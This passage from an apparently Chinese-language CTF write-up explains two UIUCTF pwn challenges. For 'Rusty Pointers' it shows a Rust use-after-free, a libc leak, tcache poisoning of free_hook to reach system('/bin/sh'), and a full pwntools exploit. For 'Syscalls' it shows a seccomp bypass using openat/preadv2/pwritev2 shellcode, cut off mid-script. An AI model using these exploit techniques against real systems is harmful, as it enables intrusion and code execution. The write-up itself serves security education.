class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Rusty-Pointers"><a href="#Rusty-Pointers" class="headerlink" title="Rusty Pointers"></a>Rusty Pointers</h2><h3 id="概况-2"><a href="#概况-2" class="headerlink" title="概况"></a>概况</h3><blockquote>
+<p>The government banned C and C++ in federal software, so we had to rewrite our train schedule management program in Rust. Thanks Joe Biden. Because of government compliance, the program is completely memory safe.</p>
+<p>36 Solves</p>
+</blockquote>
+<p>这道题是赛中和队友共同解出来的。</p>
+<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>我从来没有写过一行 Rust 代码，但是对其内存安全特性却是早有耳闻，但……真是这样吗？</p>
+<p>程序主要功能如下：</p>
+<ol>
+<li>Create a Rule or Note</li>
+<li>Delete a Rule or Note</li>
+<li>Read a Rule or Note</li>
+<li>Edit a Rule or Note</li>
+<li>Make a Law</li>
+<li>Exit</li>
+</ol>
+<p>观察源代码可以看到：</p>
+<figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> LEN: <span class="type">usize</span> = <span class="number">64</span>;</span><br><span class="line"><span class="keyword">const</span> LEN2: <span class="type">usize</span> = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">const</span> LEN3: <span class="type">usize</span> = <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_rule</span>() <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'static</span> <span class="keyword">mut</span> [<span class="type">u8</span>; LEN] {</span><br><span class="line">	<span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span> = Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; LEN]);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> buffer);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_law</span>() <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'static</span> <span class="keyword">mut</span> [<span class="type">u8</span>; LEN2] {</span><br><span class="line">	<span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span> = Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; LEN2]);</span><br><span class="line">	<span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">_buffer2</span> = Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; <span class="number">16</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> buffer);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_note</span>() <span class="punctuation">-&gt;</span> <span class="type">Box</span>&lt;[<span class="type">u8</span>; LEN]&gt;{</span><br><span class="line">	<span class="keyword">return</span> Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; LEN])</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>只有<code>get_note()</code>函数没有调用<code>get_ptr</code>，那么必有蹊跷，观察<code>get_ptr</code>函数：</p>
+<figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();</span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">'a</span>, <span class="symbol">'b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">'a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'b</span> <span class="keyword">mut</span> T {</span><br><span class="line">	<span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">'a</span>, <span class="symbol">'b</span>, T: ?<span class="built_in">Sized</span>&gt;(</span><br><span class="line">        _val_a: &amp;<span class="symbol">'a</span> &amp;<span class="symbol">'b</span> (),</span><br><span class="line">        val_b: &amp;<span class="symbol">'b</span> <span class="keyword">mut</span> T,</span><br><span class="line">	) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'a</span> <span class="keyword">mut</span> T {</span><br><span class="line">			val_b</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">'a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">	<span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>看上去非常难懂，但是 chatGPT 告诉我该函数的作用是延长变量的生命周期。可以在 gdb 中观察<code>get_rule</code>和<code>get_note</code>的区别：</p>
+<ol>
+<li><p>Create a Note 然后 Edit a Note 写入<code>aaaa</code></p>
+</li>
+<li><p>Create a Rule 然后 Edit a Rule 写入<code>bbbb</code></p>
+</li>
+<li><p>查看堆</p>
+<p><img src="https://bu.dusays.com/2024/07/06/66894a755d05c.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/06/66894a755d05c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="differnce"></p>
+</li>
+</ol>
+<p>显然，二者都会申请大小为0x50的堆块，但是<code>get_ptr()</code>函数会将这个堆块<code>free</code>掉，并允许我们继续使用这个堆块，也就是 UAF（Use After Free）。</p>
+<p>上文提到，<code>get_law()</code>也调用了<code>get_ptr()</code>，不同的是它的大小比较大：</p>
+<figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> LEN2: <span class="type">usize</span> = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span> = Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; LEN2]);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> buffer);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>因此将其<code>free</code>后会进入 unsorted bin，其<code>fd</code>和<code>bk</code>指针将会指向<code>libc</code>中的<code>main_arena</code>，造成<code>libc leak</code>：</p>
+<p><img src="https://bu.dusays.com/2024/07/06/66894d77b3676.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/06/66894d77b3676.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="libc leak"></p>
+<h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>接下来我们就需要考虑如何利用手上的 UAF 了。</p>
+<p><code>libc</code>的版本为2.31，<code>malloc_hook</code>和<code>free_hook</code>可以利用，且<code>tcache</code>没有<code>safe link</code>机制。</p>
+<p>由于拥有 Write After Free 和 Read After Free，我们可以用<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c">Tcache Poisoning</a>方法得到 Arbitrary Write 和 Arbitrary Read。</p>
+<p>我们可以利用 Arbitrary Write 将<code>free_hook</code>写为<code>system</code>函数地址，然后在一个堆块（note）开头填入<code>/bin/sh\x00</code>并将其<code>free</code>，这样就会触发<code>system('/bin/sh')</code>。</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./rusty_ptrs"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.31.so"</span>)</span><br><span class="line">ld = ELF(<span class="string">"ld-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"rustyptrs.chal.uiuc.tf"</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rule</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_note</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_rule</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_rule</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_note</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_rule</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_note</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_law</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    conn()</span><br><span class="line">    <span class="comment"># r.interactive()</span></span><br><span class="line"></span><br><span class="line">    make_law()</span><br><span class="line">    libc_leak = <span class="built_in">int</span>(r.recvuntil(<span class="string">b","</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    info(<span class="string">f"[L3ak] libc leak: <span class="subst">{<span class="built_in">hex</span>(libc_leak)}</span>"</span>)</span><br><span class="line">    libc.address = libc_leak - <span class="number">0x1ecbe0</span></span><br><span class="line">    info(<span class="string">f"[C4lc] libc base: <span class="subst">{<span class="built_in">hex</span>(libc.address)}</span>"</span>)</span><br><span class="line">    free_hook_addr = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    info(<span class="string">f"[C4lc] free hook addr: <span class="subst">{<span class="built_in">hex</span>(free_hook_addr)}</span>"</span>)</span><br><span class="line">    system_addr = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    info(<span class="string">f"[C4lc] system addr: <span class="subst">{<span class="built_in">hex</span>(system_addr)}</span>"</span>)</span><br><span class="line">    create_note()</span><br><span class="line">    create_note()</span><br><span class="line">    create_note()</span><br><span class="line">    create_note()</span><br><span class="line">    delete_note(<span class="number">3</span>)</span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    delete_note(<span class="number">1</span>)</span><br><span class="line">    delete_note(<span class="number">0</span>)</span><br><span class="line">    create_rule()</span><br><span class="line">    edit_rule(<span class="number">0</span>, p64(free_hook_addr))</span><br><span class="line">    create_note()</span><br><span class="line">    create_note()</span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    edit_note(<span class="number">1</span>, payload)           <span class="comment"># overwrite free_hook with system</span></span><br><span class="line">    edit_note(<span class="number">0</span>, <span class="string">b"/bin/sh\x00"</span>)    <span class="comment"># set /bin/sh as argument</span></span><br><span class="line">    delete_note(<span class="number">0</span>)                  <span class="comment"># delete_note wiil trigger free_hook, which will call system("{what's in note}")</span></span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Syscalls"><a href="#Syscalls" class="headerlink" title="Syscalls"></a>Syscalls</h2><h3 id="概况-3"><a href="#概况-3" class="headerlink" title="概况"></a>概况</h3><blockquote>
+<p>You can’t escape this fortress of security.</p>
+<p>143 Solves</p>
+</blockquote>
+<p>这道题是赛中独立解出来的。</p>
+<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题非常简单，程序会将我们的输入作为 shellcode 直接执行，但是通过<code>seccomp</code>对系统调用做了限制。用<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>能清晰地看到<code>seccomp</code>的规则：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./syscalls</span><br><span class="line">The flag is <span class="keyword">in</span> a file named flag.txt located <span class="keyword">in</span> the same directory as this binary. That<span class="string">'s all the information I can give you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> line  CODE  JT   JF      K</span></span><br><span class="line"><span class="string">=================================</span></span><br><span class="line"><span class="string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span></span><br><span class="line"><span class="string"> 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024</span></span><br><span class="line"><span class="string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span></span><br><span class="line"><span class="string"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span></span><br><span class="line"><span class="string"> 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024</span></span><br><span class="line"><span class="string"> 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024</span></span><br><span class="line"><span class="string"> 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024</span></span><br><span class="line"><span class="string"> 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024</span></span><br><span class="line"><span class="string"> 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024</span></span><br><span class="line"><span class="string"> 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024</span></span><br><span class="line"><span class="string"> 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024</span></span><br><span class="line"><span class="string"> 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024</span></span><br><span class="line"><span class="string"> 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024</span></span><br><span class="line"><span class="string"> 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024</span></span><br><span class="line"><span class="string"> 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024</span></span><br><span class="line"><span class="string"> 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024</span></span><br><span class="line"><span class="string"> 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024</span></span><br><span class="line"><span class="string"> 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023</span></span><br><span class="line"><span class="string"> 0018: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # writev(fd, vec, vlen)</span></span><br><span class="line"><span class="string"> 0019: 0x25 0x03 0x00 0x00000000  if (A &gt; 0x0) goto 0023</span></span><br><span class="line"><span class="string"> 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024</span></span><br><span class="line"><span class="string"> 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)</span></span><br><span class="line"><span class="string"> 0022: 0x25 0x00 0x01 0x000003e8  if (A &lt;= 0x3e8) goto 0024</span></span><br><span class="line"><span class="string"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span></span><br><span class="line"><span class="string"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到<code>execve</code>和<code>execveat</code>都被禁用，因此不能直接弹<code>shell</code>。<code>open</code>, <code>read</code>, <code>write</code>也被禁用。</p>
+<h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>可以在<a target="_blank" rel="noopener" href="https://x64.syscall.sh/">syscall.sh</a>搜索<code>open</code>/<code>read</code>/<code>write</code>找到可替代的系统调用：<code>open</code>可以用<code>openat</code>替代，<code>read</code>可以用<code>preadv2</code>替代，<code>write</code>可以用<code>pwritev2</code>替代，仍然是用<code>orw</code>（open, read, write）的方式读<code>./flag.txt</code>。用法可以通过搜索<code>man &lt;syscall name&gt;</code>找到：</p>
+<ol>
+<li><p><code>openat()</code>用法</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>If <em>pathname</em> is relative and <em>dirfd</em> is the special value <strong>AT_FDCWD</strong>, then <em>pathname</em> is interpreted relative to the current working directory of the calling process </p>
+</blockquote>
+<p><code>openat(AT_FDCWD, './flag.txt', 0)</code>代表以只读模式打开当前工作目录下的<code>./flag.txt</code>文件。</p>
+</li>
+<li><p><code>preadv2()</code>和<code>pwritev2()</code>用法</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">preadv2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt, <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwritev2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt, <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对不熟悉的系统调用/函数一般可以从互联网上找例子来理解：</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>          *str0 = <span class="string">"hello "</span>;</span><br><span class="line"><span class="type">char</span>          *str1 = <span class="string">"world\n"</span>;</span><br><span class="line"><span class="type">ssize_t</span>       nwritten;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>  <span class="title">iov</span>[2];</span></span><br><span class="line"></span><br><span class="line">iov[<span class="number">0</span>].iov_base = str0;</span><br><span class="line">iov[<span class="number">0</span>].iov_len = <span class="built_in">strlen</span>(str0);</span><br><span class="line">iov[<span class="number">1</span>].iov_base = str1;</span><br><span class="line">iov[<span class="number">1</span>].iov_len = <span class="built_in">strlen</span>(str1);</span><br><span class="line"></span><br><span class="line">nwritten = writev(STDOUT_FILENO, iov, <span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>即<code>iov</code>是一个结构体数组，每个结构体前8字节为要读/写的地址，后8字节为要读/写的长度；<code>iovcnt</code>用来表示数组中元素数量。</p>
+<blockquote>
+<p>Unlike preadv() and pwritev(), if the offset argument is -1, then the current file offset is used and updated.</p>
+<p>The flags argument contains a bitwise OR of zero or more of the following flags …</p>
+</blockquote>
+<p><code>offset</code>设置为1其实是让系统替我们管理偏移量，<code>flags</code>通常都是设置为0即可。</p>
+</li>
+</ol>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./syscalls_patched"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"syscalls.chal.uiuc.tf"</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># openat(AT_FDCWD, "./flag.txt", 0)</span></span><br><span class="line">    <span class="comment"># preadv2(3, {"rsp", 0x50}, 1, 0, 0)</span></span><br><span class="line">    <span class="comment"># pwritev2(1, {"rsp", 0x50}, 1, -1, 0)</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rax, 257</span></span><br><span class="line"><span class="string">        mov rdi, -100</span></span><br><span class="line"><span class="string">        mov rsi, 0x7478</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rsi, 0x742e67616c662f2e</span></span><br><span class="line"><span class="string">        push 